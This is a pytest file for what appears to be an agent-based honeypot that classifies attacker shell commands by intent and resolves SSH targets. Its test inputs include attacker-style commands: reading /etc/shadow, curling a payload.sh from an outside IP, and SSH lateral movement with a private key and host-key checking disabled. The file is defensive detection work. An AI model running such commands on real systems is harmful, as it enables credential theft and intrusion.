from src.agents.main_agent import MainAgent
from src.agents.sub_agent import SubAgent


def _main() -> MainAgent:
    return object.__new__(MainAgent)


def test_ssh_lateral_movement_intent():
    intent = _main()._infer_intent("ssh admin@10.0.5.2", "ssh")
    assert intent["category"] == "lateral_movement"
    assert intent["target_ip"] == "10.0.5.2"
    assert intent["requires_subagent"] is True


def test_credential_access_intent():
    intent = _main()._infer_intent("cat /etc/shadow", "ssh")
    assert intent["category"] == "credential_access"


def test_discovery_intent():
    intent = _main()._infer_intent("whoami", "ssh")
    assert intent["category"] == "discovery"


def test_http_probe_does_not_require_subagent():
    intent = _main()._infer_intent("GET / HTTP/1.1", "tcp")
    assert intent["category"] == "web_probe"
    assert intent["requires_subagent"] is False


def test_subagent_extracts_tool_transfer():
    agent = object.__new__(SubAgent)
    intent = SubAgent._extract_intent(agent, "curl http://10.0.8.7/payload.sh")
    assert intent["category"] == "tool_transfer"


def test_subagent_extract_intent_is_public():
    agent = object.__new__(SubAgent)
    intent = agent.extract_intent("ssh admin@10.0.5.2")
    assert intent["category"] == "lateral_movement"
    assert SubAgent._extract_intent is SubAgent.extract_intent


def test_ssh_options_and_host_alias_resolve_to_the_same_route():
    from src.agents.shell_world import ssh_destination
    commands = ["ssh -i /srv/backup/id_rsa -p 22 -o StrictHostKeyChecking=no svc-backup@10.0.5.2",
                "ssh -p22 -i/srv/backup/id_rsa svc-backup@db-replica-01",
                "ssh finance-replica"]
    for command in commands:
        assert ssh_destination(command) == "10.0.5.2"
        assert _main()._infer_intent(command, "ssh")["target_ip"] == "10.0.5.2"
        assert object.__new__(SubAgent).extract_intent(command)["target_ip"] == "10.0.5.2"
    assert ssh_destination("echo 'ssh svc-backup@10.0.5.2'") is None
